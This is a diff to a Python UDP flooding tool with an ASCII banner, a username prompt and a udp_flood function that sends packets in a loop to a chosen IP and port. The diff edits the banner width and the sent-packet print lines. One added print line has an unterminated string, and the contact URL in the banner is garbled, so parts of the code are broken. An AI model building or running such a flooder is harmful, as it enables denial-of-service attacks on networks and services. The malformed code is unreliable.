@@ -28,10 +28,10 @@ print("""
 \033[97m▒▒█████║▒██╔══██║▒▒▒▒██║▒▒▒▒▒██╔══██║▒██╔═══╝▒▒▒██╔══██║▒██║▒▒▒██║▒▒▒▒██║▒▒██║▒██║▒╚═╝▒██║▒▒ 
 \033[97m▒▒╚════╝▒╚═╝▒▒╚═╝▒▒▒▒╚═╝▒▒▒▒▒╚═╝▒▒╚═╝▒╚═╝▒▒▒▒▒▒▒╚═╝▒▒╚═╝▒╚═╝▒▒▒╚═╝▒▒▒▒╚═╝▒▒╚═╝▒╚═╝▒▒▒▒▒╚═╝▒▒
 \033[97m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
-print(f"\033[97m╔{'═' * 77}╗")
-print(f"\033[97m║ \033[100m{' ' * 4}v.1.0{' ' * 66}\033[0m ║")
-print(f"\033[97m║ \033[100m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 34}\033[0m ║")
-print(f"\033[97m╚{'═' * 77}╝")
+print(f"\033[97m╔{'═' * 82}╗")
+print(f"\033[97m║ \033[100m{' ' * 4}v.1.0{' ' * 70}\033[0m ║")
+print(f"\033[97m║ \033[100m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 39}\033[0m ║")
+print(f"\033[97m╚{'═' * 82}╝")
 while attemps < 100:
     print("\033[103m┏━━KunFayz━━⬣")
     username = input("\033[32m┗> Enter your username: \033[32m ")
@@ -82,8 +82,8 @@ def udp_flood(ip, port, message, duration):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"\033[97m[]  \033[103m\033[97mB E K I S\033[0m   \033[38;5;206mSENT PACKET   \033[104m \033[32m{packet_count}\033[0m \033[97mrunning\033[0m")
-            print(f"\033[31m[]  \033[96mB E K I S   \033[38;5;39m SENT PACKET   \033[33m{packet_count}. \033[32mrunning\033[0")
+            print(f"\033[100m\033[97mSending packets\033[0m \033[32m{packet_count}")
+            print(f"\033[31m[] \033[97m" +str(ip)+ ")
         except socket.error:
             # Jika soket tidak dapat mengirim paket, hentikan loop
             break
